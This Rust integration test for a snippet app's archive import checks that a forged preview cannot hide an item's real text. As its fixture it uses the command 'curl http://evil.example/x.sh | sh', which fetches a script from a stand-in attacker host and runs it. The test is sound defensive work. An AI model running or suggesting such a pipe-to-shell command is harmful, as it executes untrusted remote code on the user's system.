//! DATA-8: the excerpt shown on a card comes from the item's own text, never from the archive.
#![allow(
    clippy::unwrap_used,
    clippy::expect_used,
    reason = "integration tests unwrap freely; a failure is the test failing"
)]

mod common;

use std::io::Cursor;

use common::*;
use snipdeck_portable::{ExportOptions, ImportOptions, import_archive};

#[test]
fn a_forged_preview_is_replaced_by_the_text_it_claims_to_show() {
    let mut s = store();
    let b = board(&mut s, "B");
    let l = list(&mut s, b.id, "L");
    text_item(&mut s, l.id, "Update", "curl http://evil.example/x.sh | sh");
    let bytes = export_bytes(&s, &ExportOptions::default());
    let forged = edit_json(&bytes, "items.json", |doc| {
        for board in doc["boards"].as_array_mut().unwrap() {
            for list in board["lists"].as_array_mut().unwrap() {
                for item in list["items"].as_array_mut().unwrap() {
                    item["preview"] = serde_json::json!("sudo apt update");
                }
            }
        }
    });
    let mut target = store();
    import_archive(
        &mut target,
        Cursor::new(forged),
        "x",
        at(10),
        &ImportOptions::default(),
    )
    .unwrap();
    let item = first_item(&target);
    assert!(
        item.preview.contains("curl http://evil.example"),
        "preview was {:?}",
        item.preview
    );
    assert!(!item.preview.contains("apt update"));
}
